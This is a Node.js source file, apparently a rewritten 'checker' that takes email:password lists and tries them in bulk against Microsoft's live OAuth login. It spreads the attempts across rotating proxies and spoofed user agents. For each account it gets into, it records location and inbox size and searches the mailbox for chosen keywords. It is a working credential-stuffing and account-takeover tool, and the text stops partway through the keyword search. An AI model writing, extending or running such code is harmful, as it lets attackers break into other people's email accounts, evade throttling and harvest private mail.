#!/usr/bin/env node
/*
 * ============================================================
 *  hm-checker.js  —  single-file Microsoft / Outlook checker
 * ============================================================
 *
 *  Clean rewrite. NO license server, NO HWID telemetry, NO
 *  phone-home, NO Telegram C2, NO exploited.sh endpoint, NO
 *  vendor back-channel. Every network call goes only to
 *  *.live.com / *.office.com / *.microsoft.com, or the
 *  webhooks *you* configure (empty by default = silent).
 *
 *  Checking flow is 1:1 with Microsoft's live OAuth + OWA +
 *  substrate search endpoints. All the fallback routes from
 *  the original (prompt=none -> outlook scope -> display=touch
 *  -> PPLState=1 DoSubmit) are preserved in order.
 *
 *  Requires:  Node.js >= 18  (uses global Headers, and https/
 *             http/tls/net built-ins only — no npm deps).
 *
 *  Usage:
 *      node hm-checker.js
 *          -> interactive: asks (1) use proxies? (2) threads
 *          -> loads ./accounts.txt, ./proxies.txt, ./keywords.txt
 *
 *      node hm-checker.js --no-prompt --threads 25 --no-proxies
 *          -> scripted run, no prompts, direct connection
 *
 *  Inputs (auto-loaded from cwd if present):
 *      accounts.txt    email:password per line
 *      keywords.txt    one keyword per line (or comma-separated)
 *      proxies.txt     one proxy per line, any of:
 *                        host:port
 *                        host:port:user:pass
 *                        user:pass@host:port
 *                        http://…   https://…
 *                        socks5://… socks4://…
 *
 *  Proxy debug:
 *      HM_DEBUG_PROXY=1 node hm-checker.js ...
 *
 *  Outputs (./results/):
 *      all.txt
 *      valid/valid.txt  valid/<domain>.txt  valid/<region>/…
 *      invalid/invalid.txt
 *      hits/<keyword>.txt
 * ============================================================
 */

'use strict';

const fs = require('fs');
const fsp = require('fs/promises');
const path = require('path');
const net = require('net');
const tls = require('tls');
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const { URL, URLSearchParams } = require('url');
const readline = require('readline/promises');

// ============================================================
// SECTION 1 — CONFIG
// ============================================================

const APP = {
  name: 'hm-checker',
  version: '1.2.0',
  resultsDir: path.resolve(process.cwd(), 'results'),
  accountsFile: path.resolve(process.cwd(), 'accounts.txt'),
  keywordsFile: path.resolve(process.cwd(), 'keywords.txt'),
  proxiesFile: path.resolve(process.cwd(), 'proxies.txt'),
};

const MS = {
  LOGIN_OAUTH: 'https://login.live.com/oauth20_authorize.srf',
  DESKTOP_REDIRECT: 'https://login.live.com/oauth20_desktop.srf',
  CLIENT_XBOX: '00000000402B5328',
  CLIENT_SUBSTRATE: '0000000048170EF2',
  SCOPE_XBOX: 'service::user.auth.xboxlive.com::MBI_SSL',
  SCOPE_OUTLOOK: 'service::outlook.office.com::MBI_SSL',
  SCOPE_SUBSTRATE: 'https://substrate.office.com/User-Internal.ReadWrite',
  PROFILE_URL: 'https://substrate.office.com/profileb2/v2.0/me/V1Profile',
  SEARCH_URL: 'https://substrate.office.com/search/api/v2/query',
  OWA_URL: 'https://outlook.live.com/owa/{email}/service.svc',
  STARTUP_URL: 'https://outlook.live.com/owa/{email}/startupdata.ashx',
  SMTP_HOST: 'smtp-mail.outlook.com',
  SMTP_PORT: 587,
};

const UA_POOL = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36',
  'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36',
];

function pickUA() {
  return UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
}

// ============================================================
// SECTION 2 — COLORS / OUTPUT
// ============================================================

const C = {
  reset: '\x1b[0m', dim: '\x1b[2m',
  red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m',
  blue: '\x1b[34m', magenta: '\x1b[35m', cyan: '\x1b[36m',
  gray: '\x1b[90m',
  brightGreen: '\x1b[92m', brightYellow: '\x1b[93m',
  brightBlue: '\x1b[94m', brightMagenta: '\x1b[95m',
  brightCyan: '\x1b[96m',
};

function ts() {
  const d = new Date();
  const p = (n) => String(n).padStart(2, '0');
  return `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}

function out(color, tag, msg) {
  process.stdout.write(`${C.gray}${ts()}${C.reset} ${color}${tag}${C.reset} ${msg}\n`);
}

// ============================================================
// SECTION 3 — LOGGER
// ============================================================

class Logger {
  constructor() { this.buffer = []; this.subs = new Set(); }
  _emit(level, msg, meta) {
    const e = { t: Date.now(), level, msg, meta };
    this.buffer.push(e);
    if (this.buffer.length > 5000) this.buffer.splice(0, this.buffer.length - 5000);
    for (const fn of this.subs) { try { fn(e); } catch {} }
  }
  debug(m, x) { this._emit('debug', m, x); }
  info(m, x)  { this._emit('info',  m, x); }
  warn(m, x)  { this._emit('warn',  m, x); }
  error(m, x) { this._emit('error', m, x); }
  subscribe(fn) { this.subs.add(fn); return () => this.subs.delete(fn); }
}
const log = new Logger();

// ============================================================
// SECTION 4 — UTIL
// ============================================================

const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const randUuid = () => crypto.randomUUID();
const rndHex16 = () => crypto.randomBytes(8).toString('hex').toUpperCase();

// ============================================================
// SECTION 5 — COOKIE JAR
// ============================================================

class CookieJar {
  constructor() { this.store = new Map(); }

  setCookies(url, setCookieHeaders) {
    if (!setCookieHeaders || !setCookieHeaders.length) return;
    let host = '';
    try { host = new URL(url).hostname.toLowerCase(); } catch { return; }
    for (const raw of setCookieHeaders) {
      const parts = String(raw).split(';').map(s => s.trim());
      if (!parts.length) continue;
      const eq = parts[0].indexOf('=');
      if (eq < 0) continue;
      const name = parts[0].slice(0, eq).trim();
      const value = parts[0].slice(eq + 1);
      if (!name) continue;
      let domain = host;
      let expires = 0;
      for (let i = 1; i < parts.length; i++) {
        const seg = parts[i];
        const e2 = seg.indexOf('=');
        const k = (e2 < 0 ? seg : seg.slice(0, e2)).toLowerCase();
        const v = e2 < 0 ? '' : seg.slice(e2 + 1);
        if (k === 'domain' && v) domain = v.replace(/^\./, '').toLowerCase();
        else if (k === 'max-age') expires = Date.now() + parseInt(v, 10) * 1000;
        else if (k === 'expires' && !expires) expires = Date.parse(v) || 0;
      }
      let m = this.store.get(domain);
      if (!m) { m = new Map(); this.store.set(domain, m); }
      m.set(name, { value, expires });
    }
  }

  _domainsFor(host) {
    host = host.toLowerCase();
    const hits = [];
    for (const [d] of this.store) {
      if (host === d || host.endsWith('.' + d)) hits.push(d);
    }
    hits.sort((a, b) => b.length - a.length);
    return hits;
  }

  headerFor(url) {
    let host = '';
    try { host = new URL(url).hostname; } catch { return ''; }
    const pieces = [];
    const seen = new Set();
    for (const d of this._domainsFor(host)) {
      const m = this.store.get(d);
      for (const [name, c] of m) {
        if (c.expires && c.expires < Date.now()) { m.delete(name); continue; }
        if (seen.has(name)) continue;
        seen.add(name);
        pieces.push(`${name}=${c.value}`);
      }
    }
    return pieces.join('; ');
  }

  get(url, name) {
    let host = '';
    try { host = new URL(url).hostname; } catch { return null; }
    for (const d of this._domainsFor(host)) {
      const m = this.store.get(d);
      const c = m && m.get(name);
      if (c) {
        if (c.expires && c.expires < Date.now()) { m.delete(name); continue; }
        return c.value;
      }
    }
    return null;
  }
}

// ============================================================
// SECTION 6 — PROXY PARSING + POOL
// ============================================================

const PROXY_SCHEMES = new Set(['http', 'https', 'socks4', 'socks4a', 'socks5', 'socks5h']);

function parseProxyLine(raw, defaultScheme = 'http') {
  if (!raw) return null;
  let line = String(raw).trim();
  if (!line || line.startsWith('#')) return null;
  let scheme = defaultScheme;
  if (line.includes('://')) {
    const i = line.indexOf('://');
    const s = line.slice(0, i).toLowerCase();
    if (!PROXY_SCHEMES.has(s)) return null;
    scheme = s;
    line = line.slice(i + 3);
  }
  let user = null, pass = null;
  if (line.includes('@')) {
    const at = line.lastIndexOf('@');
    const creds = line.slice(0, at);
    line = line.slice(at + 1);
    const c = creds.split(':');
    user = c[0] ? decodeURIComponent(c[0]) : null;
    pass = c.length > 1 ? decodeURIComponent(c.slice(1).join(':')) : null;
  }
  const parts = line.split(':');
  let host, port, u2, p2;
  if (parts.length === 2) { [host, port] = parts; }
  else if (parts.length === 3) { [host, port, u2] = parts; }
  else if (parts.length === 4) { [host, port, u2, p2] = parts; }
  else return null;
  if (!host || !port) return null;
  const p = parseInt(port, 10);
  if (!Number.isInteger(p) || p < 1 || p > 65535) return null;
  if (!user && u2) user = u2;
  if (!pass && p2) pass = p2;
  if (scheme === 'socks5h') scheme = 'socks5';
  if (scheme === 'socks4a') scheme = 'socks4';
  const url = `${scheme}://${user ? `${user}:${pass || ''}@` : ''}${host}:${p}`;
  return { scheme, host, port: p, user, pass, url };
}

class ProxyPool {
  constructor({ maxFails = 3, cooldownMs = 5000 } = {}) {
    this.list = [];
    this.idx = 0;
    this.fails = new Map();
    this.stats = new Map();
    this.maxFails = maxFails;
    this.cooldownMs = cooldownMs;
  }
  load(lines) {
    this.list = [];
    for (const raw of lines) {
      const p = parseProxyLine(raw);
      if (p) this.list.push(p);
    }
    this.idx = 0;
    this.fails.clear();
    return this.list.length;
  }
  size() { return this.list.length; }
  aliveCount() {
    const now = Date.now();
    let n = 0;
    for (const p of this.list) {
      const f = this.fails.get(p.url);
      if (!f || !f.until || f.until <= now) n++;
    }
    return n;
  }
  next() {
    if (!this.list.length) return null;
    const now = Date.now();
    for (const [k, v] of [...this.fails.entries()]) {
      if (v.until && v.until <= now) this.fails.delete(k);
    }
    const alive = this.list.filter(p => !this.fails.has(p.url));
    if (!alive.length) return null;
    const pick = alive[this.idx % alive.length];
    this.idx = (this.idx + 1) % alive.length;
    return pick;
  }
  markOk(url) {
    const s = this.stats.get(url) || { used: 0, ok: 0, fail: 0 };
    s.used++; s.ok++;
    this.stats.set(url, s);
    this.fails.delete(url);
  }
  markFail(url) {
    const s = this.stats.get(url) || { used: 0, ok: 0, fail: 0 };
    s.used++; s.fail++;
    this.stats.set(url, s);
    const f = this.fails.get(url) || { count: 0, until: 0 };
    f.count++;
    if (f.count >= this.maxFails) f.until = Date.now() + this.cooldownMs;
    this.fails.set(url, f);
  }
}

// ============================================================
// SECTION 7 — PROXY TRANSPORT (robust v2)
// ============================================================
//
// Handles:
//   * http://  proxy  -> plain TCP + CONNECT
//   * https:// proxy  -> TLS to proxy + CONNECT
//   * socks5:// proxy -> SOCKS5 (with optional user/pass auth)
//   * socks4://  proxy -> SOCKS4 / 4a
//
// Reads proxy response heads robustly (CRLF or LF, split
// packets, extra bytes past the head). Surfaces real errors
// (407, CONNECT refused, closed-before-response) instead of a
// generic "socket hang up".
//
// Debug: HM_DEBUG_PROXY=1

const PROXY_DEBUG = process.env.HM_DEBUG_PROXY === '1';
function dbg(...a) { if (PROXY_DEBUG) console.error('\x1b[90m[proxy]\x1b[0m', ...a); }

function readHttpHead(sock) {
  return new Promise((resolve, reject) => {
    let buf = Buffer.alloc(0);
    let settled = false;
    const cleanup = () => {
      sock.removeListener('data', onData);
      sock.removeListener('error', onErr);
      sock.removeListener('close', onClose);
    };
    const onData = (d) => {
      if (settled) return;
      buf = Buffer.concat([buf, d]);
      let idx = buf.indexOf('\r\n\r\n');
      let sepLen = 4;
      if (idx < 0) { idx = buf.indexOf('\n\n'); sepLen = 2; }
      if (idx < 0) {
        if (buf.length > 16384) { settled = true; cleanup(); reject(new Error('proxy head too large')); }
        return;
      }
      settled = true;
      cleanup();
      const head = buf.slice(0, idx).toString('utf8');
      const rest = buf.slice(idx + sepLen);
      resolve({ head, rest });
    };
    const onErr = (e) => { if (!settled) { settled = true; cleanup(); reject(e); } };
    const onClose = () => { if (!settled) { settled = true; cleanup(); reject(new Error('proxy closed before response')); } };
    sock.on('data', onData);
    sock.once('error', onErr);
    sock.once('close', onClose);
    sock.setTimeout(20000, () => {
      if (settled) return;
      settled = true;
      cleanup();
      sock.destroy();
      reject(new Error('proxy CONNECT timeout'));
    });
  });
}

function parseConnectStatus(head) {
  const firstLine = head.split(/\r?\n/, 1)[0] || '';
  const m = firstLine.match(/^HTTP\/\d(?:\.\d)?\s+(\d{3})/);
  return {
    ok: !!m && m[1] === '200',
    status: m ? parseInt(m[1], 10) : 0,
    firstLine,
  };
}

async function connectViaHttpProxy(proxy, targetHost, targetPort) {
  dbg(`CONNECT ${targetHost}:${targetPort} via ${proxy.scheme}://${proxy.host}:${proxy.port}`);

  const rawSock = await new Promise((resolve, reject) => {
    const s = net.connect({ host: proxy.host, port: proxy.port }, () => resolve(s));
    s.once('error', reject);
    s.setTimeout(20000, () => s.destroy(new Error('proxy TCP timeout')));
  });

  let sock = rawSock;
  if (proxy.scheme === 'https') {
    dbg('TLS to proxy');
    sock = await new Promise((resolve, reject) => {
      const t = tls.connect({ socket: rawSock, servername: proxy.host }, () => resolve(t));
      t.once('error', reject);
    });
  }

  let authLine = '';
  if (proxy.user) {
    const b = Buffer.from(`${proxy.user}:${proxy.pass || ''}`).toString('base64');
    authLine = `Proxy-Authorization: Basic ${b}\r\n`;
  }
  const req =
    `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\n` +
    `Host: ${targetHost}:${targetPort}\r\n` +
    `User-Agent: hm-checker\r\n` +
    `Proxy-Connection: Keep-Alive\r\n` +
    authLine +
    `\r\n`;
  sock.write(req);

  const { head, rest } = await readHttpHead(sock);
  const { ok, status, firstLine } = parseConnectStatus(head);
  dbg(`proxy reply: ${firstLine}`);
  if (!ok) {
    sock.destroy();
    const err = new Error(`proxy CONNECT ${status || '??'} — ${firstLine}`);
    err.code = status === 407 ? 'PROXY_AUTH' : 'PROXY_CONNECT';
    throw err;
  }
  if (rest.length) sock.unshift(rest);
  return sock;
}

async function connectViaSocks5(proxy, targetHost, targetPort) {
  dbg(`SOCKS5 ${targetHost}:${targetPort} via ${proxy.host}:${proxy.port}`);

  const sock = await new Promise((resolve, reject) => {
    const s = net.connect({ host: proxy.host, port: proxy.port }, () => resolve(s));
    s.once('error', reject);
    s.setTimeout(20000, () => s.destroy(new Error('socks5 TCP timeout')));
  });

  const readN = (n) => new Promise((resolve, reject) => {
    let buf = Buffer.alloc(0);
    const onData = (d) => {
      buf = Buffer.concat([buf, d]);
      if (buf.length >= n) {
        sock.removeListener('data', onData);
        sock.removeListener('error', onErr);
        resolve(buf);
      }
    };
    const onErr = (e) => { sock.removeListener('data', onData); reject(e); };
    sock.on('data', onData);
    sock.once('error', onErr);
  });

  const methods = proxy.user
    ? Buffer.from([0x05, 0x02, 0x00, 0x02])
    : Buffer.from([0x05, 0x01, 0x00]);
  sock.write(methods);
  const greet = await readN(2);
  if (greet[1] === 0xff) { sock.destroy(); throw new Error('socks5 no acceptable auth method'); }
  const method = greet[1];

  if (method === 0x02) {
    const u = Buffer.from(proxy.user || '');
    const p = Buffer.from(proxy.pass || '');
    sock.write(Buffer.concat([Buffer.from([0x01, u.length]), u, Buffer.from([p.length]), p]));
    const authR = await readN(2);
    if (authR[1] !== 0x00) { sock.destroy(); throw new Error('socks5 auth rejected'); }
  } else if (method !== 0x00) {
    sock.destroy();
    throw new Error('socks5 unsupported auth method: ' + method);
  }

  const h = Buffer.from(targetHost);
  const portBuf = Buffer.from([(targetPort >> 8) & 0xff, targetPort & 0xff]);
  sock.write(Buffer.concat([
    Buffer.from([0x05, 0x01, 0x00, 0x03, h.length]),
    h,
    portBuf,
  ]));

  const first = await readN(4);
  if (first[1] !== 0x00) { sock.destroy(); throw new Error('socks5 connect failed: ' + first[1]); }
  let skip;
  if (first[3] === 0x01) skip = 4;
  else if (first[3] === 0x04) skip = 16;
  else if (first[3] === 0x03) {
    const lb = await readN(1);
    skip = lb[0];
  } else { sock.destroy(); throw new Error('socks5 bad atyp'); }
  await readN(skip + 2);

  return sock;
}

async function connectViaSocks4(proxy, targetHost, targetPort) {
  dbg(`SOCKS4 ${targetHost}:${targetPort} via ${proxy.host}:${proxy.port}`);

  const sock = await new Promise((resolve, reject) => {
    const s = net.connect({ host: proxy.host, port: proxy.port }, () => resolve(s));
    s.once('error', reject);
    s.setTimeout(20000, () => s.destroy(new Error('socks4 TCP timeout')));
  });

  const readN = (n) => new Promise((resolve, reject) => {
    let buf = Buffer.alloc(0);
    const onData = (d) => {
      buf = Buffer.concat([buf, d]);
      if (buf.length >= n) {
        sock.removeListener('data', onData);
        sock.removeListener('error', onErr);
        resolve(buf);
      }
    };
    const onErr = (e) => { sock.removeListener('data', onData); reject(e); };
    sock.on('data', onData);
    sock.once('error', onErr);
  });

  // SOCKS4a: use 0.0.0.1 with username and the hostname after.
  const portBuf = Buffer.from([(targetPort >> 8) & 0xff, targetPort & 0xff]);
  const userBuf = Buffer.from(proxy.user || '');
  const hostBuf = Buffer.from(targetHost);
  const req = Buffer.concat([
    Buffer.from([0x04, 0x01]),
    portBuf,
    Buffer.from([0x00, 0x00, 0x00, 0x01]), // 0.0.0.1 -> SOCKS4a
    userBuf,
    Buffer.from([0x00]),
    hostBuf,
    Buffer.from([0x00]),
  ]);
  sock.write(req);

  const resp = await readN(8);
  if (resp[1] !== 0x5a) { sock.destroy(); throw new Error('socks4 connect failed: ' + resp[1]); }
  return sock;
}

class ProxyTunnelAgent extends https.Agent {
  constructor(proxy) {
    super({ keepAlive: false, maxSockets: Infinity });
    this.proxy = proxy;
    if (proxy.scheme.startsWith('socks5')) this.kind = 'socks5';
    else if (proxy.scheme.startsWith('socks4')) this.kind = 'socks4';
    else this.kind = 'http';
  }
  createConnection(options, cb) {
    const targetHost = options.host;
    const targetPort = options.port || 443;
    const connector =
      this.kind === 'socks5' ? connectViaSocks5 :
      this.kind === 'socks4' ? connectViaSocks4 :
      connectViaHttpProxy;
    connector(this.proxy, targetHost, targetPort)
      .then((raw) => {
        const tlsSock = tls.connect({
          socket: raw,
          servername: options.servername || targetHost,
        }, () => cb(null, tlsSock));
        tlsSock.once('error', cb);
      })
      .catch((e) => {
        dbg('tunnel error:', e && e.message);
        cb(e);
      });
  }
}

// ============================================================
// SECTION 8 — HTTP CLIENT
// ============================================================

function rawRequest(url, method, headers, body, opts) {
  return new Promise((resolve, reject) => {
    let u;
    try { u = new URL(url); } catch (e) { return reject(e); }
    const isHttps = u.protocol === 'https:';
    const lib = isHttps ? https : http;
    const reqOpts = {
      method,
      hostname: u.hostname,
      port: u.port || (isHttps ? 443 : 80),
      path: u.pathname + u.search,
      headers,
    };
    if (opts.agent) reqOpts.agent = opts.agent;
    const req = lib.request(reqOpts, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const buf = Buffer.concat(chunks);
        const h = new Headers();
        for (const [k, v] of Object.entries(res.headers)) {
          if (v == null) continue;
          if (Array.isArray(v)) v.forEach(x => h.append(k, String(x)));
          else h.append(k, String(v));
        }
        const setCookies = res.headers['set-cookie'] || [];
        h.getSetCookie = () => setCookies;
        resolve({
          status: res.statusCode,
          statusText: res.statusMessage,
          ok: res.statusCode >= 200 && res.statusCode < 300,
          headers: h,
          url,
          async text() { return buf.toString('utf8'); },
          async json() { return JSON.parse(buf.toString('utf8')); },
          async arrayBuffer() { return buf; },
          _buffer: buf,
        });
      });
    });
    req.once('error', reject);
    if (opts.timeout) req.setTimeout(opts.timeout, () => req.destroy(new Error('request timeout')));
    if (body) req.write(body);
    req.end();
  });
}

async function httpRequest(url, opts = {}) {
  const method = opts.method || 'GET';
  const follow = opts.followRedirects === true;
  const maxHops = opts.maxRedirects || 10;
  let curUrl = url;
  let curMethod = method;
  let curBody = opts.body;
  for (let hop = 0; hop <= maxHops; hop++) {
    const resp = await rawRequest(curUrl, curMethod, opts.headers || {}, curBody, opts);
    if (follow && [301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('location');
      if (loc) {
        let next;
        try { next = new URL(loc, curUrl).toString(); } catch { return resp; }
        if ([301, 302, 303].includes(resp.status) && curMethod !== 'HEAD') {
          curMethod = 'GET';
          curBody = undefined;
        }
        curUrl = next;
        continue;
      }
    }
    return resp;
  }
  throw new Error('too many redirects');
}

class HttpClient {
  constructor({ proxy = null, jar = null, ua = null, timeout = 30000 } = {}) {
    this.proxy = proxy;
    this.jar = jar || new CookieJar();
    this.ua = ua || pickUA();
    this.timeout = timeout;
    this.agent = proxy ? new ProxyTunnelAgent(proxy) : null;
  }
  async _do(url, { method = 'GET', headers = {}, body, followRedirects = false,
                   form = false, json = false, timeout } = {}) {
    const h = { ...headers };
    if (!h['User-Agent']) h['User-Agent'] = this.ua;
    const cookie = this.jar.headerFor(url);
    if (cookie) h['Cookie'] = cookie;
    let payload = body;
    if (form && body && typeof body === 'object') {
      const params = new URLSearchParams();
      for (const [k, v] of Object.entries(body)) params.append(k, v);
      payload = params.toString();
      h['Content-Type'] = 'application/x-www-form-urlencoded';
    } else if (json && body && typeof body === 'object') {
      payload = JSON.stringify(body);
      h['Content-Type'] = 'application/json';
      if (!h['Accept']) h['Accept'] = 'application/json';
    }
    const resp = await httpRequest(url, {
      method, headers: h, body: payload,
      agent: this.agent, timeout: timeout || this.timeout,
      followRedirects,
    });
    const sc = resp.headers.getSetCookie ? resp.headers.getSetCookie() : [];
    this.jar.setCookies(url, sc);
    return resp;
  }
  get(url, opts = {}) { return this._do(url, { ...opts, method: 'GET' }); }
  post(url, body, opts = {}) { return this._do(url, { ...opts, method: 'POST', body }); }
}

// ============================================================
// SECTION 9 — OAUTH LOGIN (1:1 with original fallback chain)
// ============================================================

function extractPpftAndUrlPost(html) {
  let ppft = null;
  let urlPost = null;
  let m = html.match(/value=\\?"([^"\\]+)\\?"/);
  if (m) ppft = m[1];
  m = html.match(/"urlPost"\s*:\s*"([^"]+)"/);
  if (m) urlPost = m[1];
  if (!urlPost) {
    m = html.match(/urlPost\\?"\s*:\s*\\?"([^"\\]+)/);
    if (m) urlPost = m[1];
  }
  return { ppft, urlPost };
}

function extractAccessToken(loc) {
  if (!loc || !loc.includes('access_token=')) return null;
  const parts = loc.split('access_token=');
  if (parts.length < 2) return null;
  let v = parts[1].split('&')[0];
  try { v = decodeURIComponent(v); } catch {}
  return v;
}

async function oauthLogin(email, password, { proxy = null, ua = null } = {}) {
  const jar = new CookieJar();
  const client = new HttpClient({ proxy, jar, ua: ua || pickUA(), timeout: 30000 });

  const authUrl =
    `${MS.LOGIN_OAUTH}?client_id=${MS.CLIENT_XBOX}` +
    `&redirect_uri=${encodeURIComponent(MS.DESKTOP_REDIRECT)}` +
    `&scope=${encodeURIComponent(MS.SCOPE_XBOX)}` +
    `&display=touch&response_type=token&locale=en`;

  let authResp;
  try { authResp = await client.get(authUrl, { followRedirects: false }); }
  catch (e) { return { error: 'authorize GET: ' + ((e && e.message) || e) }; }
  if (authResp.status !== 200) return { error: `authorize GET ${authResp.status}` };

  const authHtml = await authResp.text();
  const { ppft, urlPost } = extractPpftAndUrlPost(authHtml);
  if (!ppft) return { error: 'no PPFT in authorize page' };
  if (!urlPost) return { error: 'no urlPost in authorize page' };

  const form = {
    i13: '1', login: email, loginfmt: email, type: '11', LoginOptions: '1',
    passwd: password, ps: '2', PPFT: ppft, PPSX: 'PassportR',
    NewUser: '1', FoundMSAs: '', fspost: '0', i21: '0',
    CookieDisclosure: '0', IsFidoSupported: '0', i19: '9960',
  };

  let postResp;
  try {
    postResp = await client.post(urlPost, form, {
      form: true,
      followRedirects: false,
      headers: { Origin: 'https://login.live.com', Referer: authResp.url || authUrl },
    });
  } catch (e) { return { error: 'credential POST: ' + ((e && e.message) || e) }; }

  const loc1 = postResp.headers.get('location') || '';
  const pplstate = jar.get('https://login.live.com/', 'PPLState') || '';

  if (!loc1.includes('access_token=') && pplstate !== '1') {
    const body = ((await postResp.text()) || '').toLowerCase();
    if (body.includes('incorrect') || body.includes("doesn't exist") || body.includes('doesn\u2019t exist')) {
      return { invalid: true, error: 'invalid credentials' };
    }
    if (/too many|rate limit|temporarily|try again|locked/.test(body)) {
      return { error: 'throttled by Microsoft' };
    }
    if (/passkey|sign in another way/.test(body)) {
      return { error: 'passkey/2FA required' };
    }
    return { error: 'no token in credential response' };
  }

  let cid = jar.get('https://login.live.com/', 'MSPCID') || rndHex16();
  cid = String(cid).toUpperCase();

  let msToken = null;

  // Route A: substrate scope + prompt=none
  if (!msToken) {
    try {
      const u = `${MS.LOGIN_OAUTH}?client_id=${MS.CLIENT_SUBSTRATE}` +
        `&redirect_uri=${encodeURIComponent(MS.DESKTOP_REDIRECT)}` +
        `&scope=${encodeURIComponent(MS.SCOPE_SUBSTRATE)}` +
        `&response_type=token&prompt=none`;
      const r = await client.get(u, { followRedirects: false });
      msToken = extractAccessToken(r.headers.get('location') || '');
    } catch {}
  }
  // Route B: outlook.office.com scope + prompt=none
  if (!msToken) {
    try {
      const u = `${MS.LOGIN_OAUTH}?client_id=${MS.CLIENT_SUBSTRATE}` +
        `&redirect_uri=${encodeURIComponent(MS.DESKTOP_REDIRECT)}` +
        `&scope=${encodeURIComponent(MS.SCOPE_OUTLOOK)}` +
        `&response_type=token&prompt=none`;
      const r = await client.get(u, { followRedirects: false });
      msToken = extractAccessToken(r.headers.get('location') || '');
    } catch {}
  }
  // Route C: substrate scope + display=touch, follow redirects
  if (!msToken) {
    try {
      const u = `${MS.LOGIN_OAUTH}?client_id=${MS.CLIENT_SUBSTRATE}` +
        `&redirect_uri=${encodeURIComponent(MS.DESKTOP_REDIRECT)}` +
        `&scope=${encodeURIComponent(MS.SCOPE_SUBSTRATE)}` +
        `&display=touch&response_type=token&locale=en`;
      const r = await client.get(u, { followRedirects: true });
      msToken = extractAccessToken(r.url || '') || extractAccessToken(r.headers.get('location') || '');
    } catch {}
  }
  // Route D: PPLState=1 retry with DoSubmit
  if (!msToken && pplstate === '1') {
    try {
      const u = `${MS.LOGIN_OAUTH}?client_id=${MS.CLIENT_SUBSTRATE}` +
        `&redirect_uri=${encodeURIComponent(MS.DESKTOP_REDIRECT)}` +
        `&scope=${encodeURIComponent(MS.SCOPE_SUBSTRATE)}` +
        `&display=touch&response_type=token&locale=en`;
      const r5 = await client.get(u, { followRedirects: false });
      const html5 = await r5.text();
      const { ppft: ppft2, urlPost: urlPost2 } = extractPpftAndUrlPost(html5);
      if (ppft2 && urlPost2) {
        const post2 = await client.post(urlPost2, { ...form, PPFT: ppft2 }, {
          form: true, followRedirects: false,
          headers: { Origin: 'https://login.live.com', Referer: u },
        });
        const loc = post2.headers.get('location') || '';
        msToken = extractAccessToken(loc);
        if (!msToken && post2.status === 200) {
          const b5 = await post2.text();
          if (b5.includes('DoSubmit')) {
            const actionM = b5.match(/action="([^"]+)"/);
            if (actionM) {
              const actionUrl = actionM[1].replace(/&amp;/g, '&');
              const fd = {};
              const re = /<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"/g;
              let im;
              while ((im = re.exec(b5))) fd[im[1]] = im[2];
              const post3 = await client.post(actionUrl, fd, {
                form: true, followRedirects: true,
                headers: { Origin: 'https://login.live.com' },
              });
              msToken = extractAccessToken(post3.url || '');
            }
          }
        }
      }
    } catch {}
  }

  return { email, cid, token: msToken, jar, client };
}

// ============================================================
// SECTION 10 — PROFILE + INBOX
// ============================================================

async function fetchLocation(client, token, cid) {
  if (!token) return 'Unknown';
  try {
    const r = await client.get(MS.PROFILE_URL, {
      followRedirects: false,
      headers: {
        Authorization: `Bearer ${token}`,
        'X-AnchorMailbox': `CID:${cid}`,
        'User-Agent': 'Outlook-Android/2.0',
        Accept: 'application/json',
      },
    });
    if (r.status !== 200) return 'Unknown';
    const j = await r.json();
    const acc = j && j.accounts && j.accounts[0];
    return (acc && acc.location) || 'Unknown';
  } catch { return 'Unknown'; }
}

async function fetchInboxCount(client, token, cid, email) {
  if (!token) return 0;
  try {
    const r = await client.post(
      `${MS.STARTUP_URL.replace('{email}', encodeURIComponent(email))}?app=Mini&n=0`,
      '',
      {
        followRedirects: false,
        headers: {
          authorization: `Bearer ${token}`,
          'x-owa-sessionid': randUuid(),
          'X-AnchorMailbox': `CID:${cid}`,
          'User-Agent': 'Outlook-Android/2.0',
        },
      }
    );
    if (r.status === 200) {
      const txt = await r.text();
      const m = txt.match(/"TotalCount":(\d+)/);
      if (m) return parseInt(m[1], 10) || 0;
    }
  } catch {}
  try {
    const sid = randUuid();
    const payload = {
      Cvid: sid,
      Scenario: { Name: 'owa.react' },
      TimeZone: 'UTC',
      TextDecorations: 'Off',
      EntityRequests: [{
        EntityType: 'Conversation',
        ContentSources: ['Exchange'],
        Filter: { Or: [{ Term: { DistinguishedFolderName: 'msgfolderroot' } }] },
        From: 0,
        Query: { QueryString: '*' },
        Size: 1,
        Sort: [{ Field: 'Time', SortDirection: 'Desc' }],
      }],
      LogicalId: sid,
    };
    const r = await client.post(MS.SEARCH_URL, payload, {
      json: true,
      headers: {
        Authorization: `Bearer ${token}`,
        'X-AnchorMailbox': `CID:${cid}`,
        'User-Agent': 'Outlook-Android/2.0',
      },
    });
    if (r.status === 200) {
      const j = await r.json();
      const total = j && j.EntitySets && j.EntitySets[0] &&
                    j.EntitySets[0].ResultSets && j.EntitySets[0].ResultSets[0] &&
                    j.EntitySets[0].ResultSets[0].Total;
      return total || 0;
    }
  } catch {}
  return 0;
}

// ============================================================
// SECTION 11 — KEYWORD SEARCH
// ============================================================

async function searchKeyword(client, token, cid, kw) {
  const query = kw.includes('@') ? `from:${kw}` : kw;
  const sid = randUuid();
  const payload = {
    Cvid: sid,
    Scenario: { Name: 'owa.react' },
    TimeZone: 'UTC',
    TextDecorations: 'Off',
    EntityRequests: [{
      EntityType: 'Conversation',
